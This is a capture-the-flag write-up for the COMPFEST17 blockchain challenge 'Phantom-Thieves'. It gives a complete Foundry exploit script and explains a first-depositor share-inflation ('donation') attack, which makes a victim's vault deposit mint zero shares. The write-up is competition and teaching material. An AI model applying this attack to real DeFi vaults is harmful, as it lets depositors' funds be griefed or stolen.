---
title: Phantom-Thieves
categories: Blockchain
authors: xymbol
tags: 
draft: true
completedDuringEvent: true
submitted: true
points: 100 
solves: 42
flags: COMPFEST17{}
---

> Let's infiltrate this palace and make the greedy king got trapped!

---

This challenge revolves around a share-based ERC-20 vault whose share math can be manipulated with a simple "donation" to the vault. By seeding the vault with an extremely skewed balance-to-share ratio, we force the king’s `openVault()` to preview a mint of **zero shares** and revert with `NoShares()`. The setup contract marks the level as solved precisely when that revert selector is observed via a `staticcall`.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Script.sol";
import "../src/Setup.sol";
import "../src/Fortress.sol";

contract ExploitScript is Script {
    Setup setup;
    Fortress fortress;
    Vault vault;
    PhantomCoin token;

    function setUp() public {
        setup = Setup(payable(0x0));
        fortress = Fortress(setup.challenge());
        vault = Vault(fortress.vault());
        token = PhantomCoin(fortress.token());
    }

    function run() external {
        vm.startBroadcast();

        token.buyTokens{value: 1 ether}();

        uint256 bal = token.balanceOf(msg.sender);

        token.approve(address(vault), 1);
        vault.deposit(1);

        uint256 leftover = token.balanceOf(msg.sender);
        token.transfer(address(vault), leftover);

        vm.stopBroadcast();
    }
}
```

This script wires up references to the challenge contracts. In a real run you’d point `setup` to the deployed `Setup` address, fetch the `Fortress`, then derive the `vault` and `token` from it.

We mint 1 ether worth of PHTM to ourselves. (The token mints 1:1 with `msg.value`.)

Crucial step: deposit exactly **1 wei** PHTM as the **first** depositor. Because `totalShares == 0`, the vault mints `newShares = _amount = 1`. This anchors the vault at `totalShares = 1`.

Finally, we **donate** all remaining PHTM directly to the vault. Donations increase `token.balanceOf(vault)` but do **not** mint shares. The vault now has a massive `currentBalance` against just **one** outstanding share.
